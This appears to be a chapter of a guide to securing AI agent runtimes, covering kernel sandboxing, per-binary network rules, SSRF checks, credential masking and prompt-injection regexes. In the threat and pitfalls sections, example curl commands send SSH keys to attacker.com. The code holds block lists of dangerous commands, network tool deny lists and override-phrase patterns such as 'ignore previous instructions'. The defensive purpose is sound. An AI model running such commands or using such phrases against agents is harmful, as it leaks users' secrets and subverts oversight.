# Module 8: Security Envelope

> Wraps the entire Agent runtime. The Agent doesn't know it's there. Constrains the environment, not the code.

---

## What Is It

Security Envelope is the outermost boundary in the reference architecture. It sits outside Agent Core, outside Interface, outside everything. It constrains what the runtime can do at the OS and network level.

```
╔═══════════════════════════════════════════════╗
║  SECURITY ENVELOPE                            ║
║  ┌─────────────────────────────────────────┐  ║
║  │  Interface → Gateway → Agent Core       │  ║
║  │      ├── Model  ├── Tools               │  ║
║  │      ├── Memory └── Context Manager     │  ║
║  └─────────────────────────────────────────┘  ║
║                                               ║
║  The Agent cannot see this box.               ║
║  It just finds some things don't work.        ║
╚═══════════════════════════════════════════════╝
```

The key design principle: the Agent is **unaware** of the envelope. It doesn't call a `checkPermission()` function. It tries to read `/etc/passwd` and gets a kernel-level EACCES. It tries to `curl` data to an external server and the connection is refused. The security is not in the code — it's in the environment.

This is fundamentally different from application-level security (like tool approval flows, which live in Module 3: Tools). Both can coexist. Application-level security asks "should the Agent do this?" Envelope security enforces "the Agent physically cannot do this."

---

## What Problem Does It Solve

Four threats compound when an Agent can execute code or access the network:

1. **Filesystem escape.** The Agent reads files it shouldn't — credentials, SSH keys, other users' data. Or worse, writes to files it shouldn't — corrupting configs, dropping malware, modifying its own instructions.

2. **Data exfiltration.** The Agent executes `curl https://attacker.com/steal?data=$(cat ~/.ssh/id_rsa)`. If it can run shell commands and access the network, it can send anything anywhere.

3. **Internal network attack (SSRF).** The Agent is told "fetch https://internal-api.company.com/admin/delete-all" through a crafted prompt. Without SSRF protection, it happily hits your internal services.

4. **Credential leakage.** The Agent runs a command whose output contains an API key or Bearer token. That output goes into the conversation history, gets logged, possibly sent to a third-party model provider.

A pure chatbot that only generates text doesn't face these threats. The moment your Agent can execute shell commands, read files, or make HTTP requests, you need an envelope.

---

## How the 4 Projects Do It

### NemoClaw: The Gold Standard

NemoClaw is the only project that treats security as a first-class engineering problem rather than an afterthought. Five independent mechanisms, each targeting a different attack vector:

**1. Landlock filesystem isolation.**
Configures Linux Landlock LSM to enforce filesystem boundaries at the kernel level. Config files are mounted read-only. Writable data goes to a separate, isolated path. The Agent process cannot escalate its own permissions — even if it achieves code execution, the kernel blocks unauthorized file access.

Specifics: the sandbox config specifies exact paths that are readable vs. writable. Everything else is denied by default. There's no "allow all reads" convenience flag.

**2. Per-binary network policy.**
This is NemoClaw's most distinctive feature. It doesn't just restrict which hosts can be reached — it restricts **which binary** can access the network. If `curl` is not in the whitelist, the Agent cannot use `curl` to exfiltrate data. Period.

This matters because host-based restrictions alone are insufficient. An attacker can encode data in DNS queries, use allowed hosts as relay points, or tunnel through permitted connections. Per-binary restrictions cut off the exfiltration tools entirely. The Agent's whitelisted binaries (e.g., `node`, `python`) can access allowed hosts. Non-whitelisted binaries (e.g., `curl`, `wget`, `nc`) cannot access the network at all.

**3. seccomp process sandbox.**
Syscall-level filtering using Linux seccomp-bpf. The Agent process runs as non-root with a restricted set of allowed system calls. Dangerous tools are removed from the environment entirely — no `gcc` (can't compile arbitrary code), no `netcat` (can't open raw sockets).

The philosophy: don't just restrict what the Agent can do — remove the tools it would use to do it.

**4. SSRF protection.**
When the Agent requests a URL, NemoClaw resolves the DNS first, then checks whether **any** of the resolved IP addresses are internal (RFC 1918 ranges, loopback, link-local). If so, the request is blocked. This prevents DNS rebinding attacks where a domain initially resolves to a public IP during validation but later resolves to an internal IP during the actual request.

Key detail: it checks **all** IPs returned by DNS, not just the first one. A domain that resolves to both `1.2.3.4` and `10.0.0.5` is blocked.

**5. Credential desensitization.**
Shell output is automatically scanned and masked before it enters the conversation history. Regex patterns catch API keys (common prefix patterns like `sk-`, `AKIA`), Bearer tokens, passwords in connection strings, and other credential formats. The Agent sees `sk-****` instead of the actual key.

This is defense-in-depth. Even if the other four mechanisms fail and the Agent accesses something it shouldn't, the credential never makes it into the conversation where it could be logged, sent to a model provider, or surfaced to an attacker.

### hermes-agent: `approval.py`

hermes takes the application-level approach. No OS isolation — just pattern matching and prompt scanning.

**Dangerous command detection.** Regex patterns match shell commands that could cause damage: `rm -rf`, `sudo`, `curl | bash`, `chmod 777`, writing to system paths. When a match is found, the command is blocked or requires explicit user approval.

**Prompt injection scanning.** Scans tool arguments for patterns that look like injected instructions: "ignore previous instructions", "you are now", system prompt overrides. Detected injections are logged and blocked.

**Limitations:** Regex-based detection is inherently incomplete. An attacker who knows the patterns can trivially bypass them — base64 encoding, command aliasing, indirect execution. hermes acknowledges this trade-off: it's designed for single-user local scenarios where the threat model is accidental damage, not adversarial attack.

### openclaw: DM Pairing + Exec Approval

openclaw operates in multi-user environments (Discord, Telegram, Slack), which creates a different threat model: the attacker might be another user in the same channel.

**DM pairing.** The user who installed the Agent must confirm dangerous actions via direct message. This prevents other channel members from manipulating the Agent into executing commands on the installer's behalf.

**Exec approval flow.** Dangerous operations trigger an approval request. The Agent pauses execution until the authorized user approves via DM. If no response within the timeout, the action is denied.

**Rate limiting.** Per-tool-category rate limits prevent runaway execution. Even if an approval is granted, the Agent can't execute 1000 shell commands per minute.

**Limitations:** DM pairing assumes the messaging platform's DM system is secure. Rate limiting is a coarse control — it limits volume, not intent. No OS-level isolation.

### Claude Code: Permission Modes + Enterprise Policy

Claude Code targets a different deployment: single-user, local machine, often behind corporate security.

**Permission modes.** Two modes: `ask` (prompt the user before executing any tool that modifies the filesystem or runs commands) and `auto` (execute without prompting, typically for read-only operations). Modes are configurable per tool category.

**Enterprise policy limits.** In corporate deployments, MDM (Mobile Device Management) can push policies that restrict which tools are available, which directories are writable, and whether network access is permitted. The Agent cannot override these policies.

**Speculative execution interaction.** In `ask` mode, Claude Code runs the tool speculatively while showing the permission prompt. If denied, results are discarded. This means the tool has already executed by the time the user says no — acceptable because the user controls their own machine, but it would be a security issue in a multi-tenant environment.

**Limitations:** No OS-level isolation. Single-user assumption means no protection against the user themselves. Enterprise policies depend on MDM infrastructure that not all deployments have.

---

## Comparison Table

| Aspect | hermes | openclaw | NemoClaw | Claude Code |
|--------|--------|----------|----------|-------------|
| **Approach** | Application-level regex | Application-level approval flow | OS-level kernel enforcement | Application-level permission modes |
| **Filesystem isolation** | None | None | Landlock LSM (kernel-level) | None |
| **Network restriction** | None | Rate limiting only | Per-binary policy (which program can connect) | Enterprise policy (optional) |
| **Process sandbox** | Docker (optional) | None | seccomp-bpf + non-root + tool removal | None |
| **SSRF protection** | None | None | DNS resolution + IP range check | None |
| **Credential masking** | None | None | Regex auto-mask on shell output | None |
| **Command approval** | Regex pattern match | DM pairing + explicit approval | N/A (blocked at OS level) | ask/auto permission modes |
| **Prompt injection defense** | Pattern scanning | None (relies on approval flow) | N/A (Agent can't act on injections if tools are blocked) | None explicitly |
| **Multi-user safe** | No (single-user) | Yes (DM pairing) | Yes (per-sandbox isolation) | No (single-user) |
| **Bypass difficulty** | Low (regex is evadable) | Medium (requires DM access) | High (kernel-enforced) | Low (user controls their own machine) |
| **Setup complexity** | Minimal (one Python file) | Moderate (messaging integration) | High (Linux kernel features) | Minimal (config flag) |

---

## Best Practices

**Start with command approval. It costs nothing.** A regex list of dangerous patterns (`rm -rf`, `sudo`, `curl | bash`, `chmod 777`, writes to `/etc/`) catches 80% of accidental damage. hermes's `approval.py` is under 200 lines. You can ship this on day one.

**Add credential masking early.** Every time your Agent runs a shell command, the output might contain secrets. A regex scan for common credential patterns (`sk-`, `AKIA`, `Bearer `, `password=`, connection strings) costs microseconds and prevents the most embarrassing class of leaks. Do this before the output enters the conversation history, before it gets logged, before it gets sent anywhere.

**Layer your defenses.** Application-level approval and OS-level enforcement are not alternatives — they're complementary. Application-level approval handles the "should we?" question with human judgment. OS-level enforcement handles the "can we?" question with kernel guarantees. NemoClaw + openclaw together demonstrate both layers coexisting.

**OS-level isolation is mandatory for untrusted code.** If your Agent runs user-submitted code, code from untrusted sources, or operates in a multi-tenant environment, regex pattern matching is not enough. You need Landlock (filesystem), seccomp (syscalls), and network policies (per-binary). This is non-negotiable for production deployments with untrusted input.

**Per-binary network policy beats host whitelisting.** Whitelisting allowed hosts (`api.openai.com`, `github.com`) feels intuitive but is insufficient. Data can be exfiltrated through DNS queries, encoded in allowed requests, or tunneled through permitted hosts. Restricting which binary can access the network (only `node`, not `curl`) eliminates entire classes of exfiltration.

**Check all resolved IPs for SSRF, not just the first.** A domain can resolve to multiple addresses. If you only check the first A record, a DNS response containing both `93.184.216.34` and `10.0.0.1` passes validation but the connection might use the internal IP. Check every IP. Block if any is internal.

**Don't rely on the Agent to self-police.** "Please don't access files outside the project directory" in the system prompt is not security. It's a suggestion to a stochastic text generator. Prompt injection can override it. Hallucination can ignore it. Security constraints must be enforced by the runtime, not requested of the model.

---

## Step-by-Step: How to Build It

### Phase 1: Command Approval (Day One)

Build a simple pattern-matching approval gate. This goes inside your tool execution flow (see Module 3: Tools), but the patterns themselves are security policy — envelope territory.

```
// Dangerous command patterns
const BLOCKED_PATTERNS = [
  /rm\s+(-rf?|--recursive)/,
  /sudo\s/,
  /chmod\s+777/,
  /curl.*\|\s*(bash|sh)/,
  />\s*\/etc\//,
  /mkfs/,
  /dd\s+if=/
]

function requiresApproval(command: string): boolean {
  return BLOCKED_PATTERNS.some(p => p.test(command))
}
```

When a command matches, pause execution and ask the user. Don't auto-deny — the user might legitimately need `sudo`. The point is human-in-the-loop for dangerous operations.

Also add a writable path whitelist:
```
const ALLOWED_WRITE_PATHS = ['/workspace/', '/tmp/agent/']

function isWriteAllowed(path: string): boolean {
  return ALLOWED_WRITE_PATHS.some(p => path.startsWith(p))
}
```

### Phase 2: Credential Masking

Intercept all tool output before it enters the conversation history.

```
const CREDENTIAL_PATTERNS = [
  /sk-[a-zA-Z0-9]{20,}/g,              // OpenAI keys
  /AKIA[A-Z0-9]{16}/g,                 // AWS access keys
  /Bearer\s+[a-zA-Z0-9\-._~+\/]+=*/g, // Bearer tokens
  /password[=:]\s*\S+/gi,              // Password in configs
  /ghp_[a-zA-Z0-9]{36}/g,             // GitHub PATs
  /-----BEGIN (RSA |EC )?PRIVATE KEY-----/g
]

function maskCredentials(output: string): string {
  let masked = output
  for (const pattern of CREDENTIAL_PATTERNS) {
    masked = masked.replace(pattern, (match) => {
      const prefix = match.slice(0, Math.min(6, match.length))
      return `${prefix}****`
    })
  }
  return masked
}
```

Wire this into your tool result handler:
```
// In Agent Core's tool execution flow:
const rawResult = await tool.execute(args)
const safeResult = maskCredentials(rawResult)
messages.push({ role: 'tool', content: safeResult })
```

### Phase 3: SSRF Protection

If your Agent makes HTTP requests (web search, API calls, URL fetching), add SSRF checks.

```
import { resolve } from 'dns/promises'

const INTERNAL_RANGES = [
  /^10\./,
  /^172\.(1[6-9]|2[0-9]|3[01])\./,
  /^192\.168\./,
  /^127\./,
  /^0\./,
  /^169\.254\./,    // link-local
  /^::1$/,          // IPv6 loopback
  /^fc00:/,         // IPv6 unique local
  /^fe80:/          // IPv6 link-local
]

async function isSafeUrl(url: string): Promise<boolean> {
  const hostname = new URL(url).hostname
  const addresses = await resolve(hostname)

  // Check ALL resolved IPs, not just the first
  for (const addr of addresses) {
    if (INTERNAL_RANGES.some(r => r.test(addr))) {
      return false
    }
  }
  return true
}
```

Call this before every outbound HTTP request from tool execution. No exceptions — even if the URL "looks" external.

### Phase 4: Prompt Injection Scanning

Scan tool arguments and user inputs for injection patterns.

```
const INJECTION_PATTERNS = [
  /ignore\s+(all\s+)?previous\s+instructions/i,
  /you\s+are\s+now\s+(a|an)\s/i,
  /system\s*:\s/i,
  /\[INST\]/i,
  /<\|im_start\|>/i,
  /do\s+not\s+follow\s+your\s+(instructions|rules)/i
]

function detectInjection(input: string): boolean {
  return INJECTION_PATTERNS.some(p => p.test(input))
}
```

This is not foolproof. Determined attackers will evade regex patterns. The value is catching unsophisticated injection attempts and logging them for review.

### Phase 5: OS-Level Isolation (When Running Untrusted Code)

This requires Linux. If you're deploying on Linux and your Agent runs untrusted code, add kernel-level enforcement.

**Landlock filesystem policy:**
```bash
# Conceptual — actual implementation uses Landlock syscalls
# Read-only: config files, system libraries
READONLY_PATHS="/etc/agent/config:/usr/lib"
# Read-write: workspace and temp
READWRITE_PATHS="/workspace:/tmp/agent"
# Everything else: denied
```

**seccomp profile:**
```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    { "names": ["read", "write", "open", "close", "stat", "fstat",
                 "mmap", "mprotect", "munmap", "brk", "ioctl",
                 "access", "pipe", "select", "clone", "execve",
                 "exit_group", "getpid", "getuid"],
      "action": "SCMP_ACT_ALLOW" }
  ]
}
```

**Per-binary network policy:**
```
# Only these binaries can access the network
NETWORK_ALLOWED_BINARIES=node,python3
# These are explicitly blocked
NETWORK_BLOCKED_BINARIES=curl,wget,nc,ncat
```

**Remove dangerous tools from the container:**
```dockerfile
RUN apt-get remove -y gcc g++ make netcat-openbsd ncat \
    && rm -f /usr/bin/curl /usr/bin/wget
```

This is the NemoClaw approach. It's heavy to set up but provides guarantees that no amount of application-level checking can match.

### Phase 6: Wire It All Together

The envelope wraps the entire runtime. In practice:

```
// Startup sequence
1. Apply OS-level policies (Landlock, seccomp) — if on Linux
2. Start Agent runtime inside the constrained environment
3. Agent Core initializes normally — unaware of constraints
4. Tool execution flow includes:
   a. Command approval check (Phase 1)
   b. SSRF check for HTTP tools (Phase 3)
   c. Injection scan on tool args (Phase 4)
   d. Execute tool
   e. Credential masking on output (Phase 2)
   f. Return masked result to conversation
```

The Agent never calls any of these functions directly. The envelope is infrastructure, not application code.

---

## Common Pitfalls

**Relying on system prompt instructions for security.** "You must never access files outside /workspace" is not a security boundary. It's a polite request to a language model. Prompt injection overrides it. Model hallucination ignores it. Jailbreaks bypass it. If the process can physically access `/etc/shadow`, the system prompt won't save you.

**Checking only the first DNS resolution for SSRF.** A domain can return multiple A records. An attacker controls the order. If you validate only the first IP and connect to a different one, your check is useless. Resolve all addresses, check all of them. NemoClaw does this right.

**Host-only network whitelisting without binary restrictions.** You whitelist `api.openai.com` and feel safe. Then the Agent runs `curl https://api.openai.com/proxy?redirect=http://attacker.com/steal` or encodes data in DNS queries. Host whitelisting is necessary but insufficient. Per-binary restrictions (which program can connect) eliminate the tools an attacker would use.

**Masking credentials after they've been logged.** If your tool output goes to a log file, gets sent to a telemetry service, or is stored in conversation history before credential masking runs, the secret is already leaked. Masking must happen at the earliest possible point — immediately when the tool returns its output, before any other processing.

**All-or-nothing permission models.** "approve all" and "deny all" are both bad defaults. "Approve all" is insecure. "Deny all" makes the Agent useless. The useful middle ground is per-category permissions: auto-approve reads, prompt for writes, block destructive operations. Claude Code's ask/auto split per tool category gets this right.

**Treating Docker as sufficient isolation.** Docker provides process namespace isolation but is not a security boundary against a determined attacker. Container escapes exist. If the Agent runs as root inside the container, it's one kernel exploit away from the host. NemoClaw layers Landlock + seccomp + non-root + tool removal on top of containerization.

**Forgetting that the Agent can modify its own security config.** If the security configuration file is writable by the Agent process, the Agent can edit its own restrictions. Landlock read-only mounts prevent this at the kernel level. At the application level, ensure config files are not in the Agent's writable path.

---

## Cross-Module Contracts

Security Envelope is invisible to the modules it protects, but it has implicit contracts with several of them:

| Contract | Between | What |
|----------|---------|------|
| **Tool output interception** | Envelope → Tools (Module 3) | Credential masking must intercept tool output before it enters the conversation. This means the masking function sits between Tools' `execute()` return and Agent Core's message append. If Tools changes its output format, masking patterns may need updating. |
| **HTTP request interception** | Envelope → Tools (Module 3) | SSRF checks must intercept all outbound HTTP requests from tools. Tools that make HTTP calls (web search, URL fetch, API calls) must route through the SSRF checker. Adding a new HTTP-capable tool requires ensuring it uses the checked HTTP client. |
| **Command execution interception** | Envelope → Tools (Module 3) | Command approval must intercept all shell commands before execution. The approval function needs the raw command string. If Tools wraps commands in a different format, the approval patterns need updating. |
| **Filesystem path enforcement** | Envelope → Storage (Module 9) | Landlock policies define which paths are readable/writable. Storage backends must use paths within the allowed set. If Storage tries to write to a path outside the writable set, it gets a kernel error with no application-level explanation. |
| **Network policy vs. Model calls** | Envelope → Model (Module 2) | Model service makes outbound API calls to LLM providers. The network policy must whitelist the Model service's binary and the provider's hosts. If the Model service switches providers or binaries, the network policy needs updating. |
| **Permission mode configuration** | Envelope → Agent Core (Module 1) | In Claude Code's model, Agent Core reads the permission mode (ask/auto) and acts accordingly during tool dispatch. The envelope provides the policy; Core enforces it in the application layer. |
| **Prompt injection defense** | Envelope → Interface (Module 6) | Injection scanning should ideally run on user input at the Interface layer, before it reaches Agent Core. If Interface changes its message format, injection patterns may need updating. |

**What happens if these contracts break:**
- Add a new HTTP tool without routing through SSRF check → Agent can now hit internal services through that tool
- Change the tool output format → credential masking regex stops matching → secrets leak into conversation
- Move the storage path outside Landlock's writable set → writes silently fail with EACCES → the Agent reports a generic "file write failed" error with no security context
- Allow a new binary in the container without updating network policy → that binary becomes an exfiltration vector

The critical insight: Security Envelope contracts are implicit. The protected modules don't call envelope functions — the envelope intercepts at the infrastructure level. This means **breaking changes are silent**. No compiler error, no type check. The only way to catch them is security-focused code review and penetration testing.

---

*Next: [Module 9 — Storage](09-storage.md) | Previous: [Module 7 — Gateway & Routing](07-gateway-routing.md)*
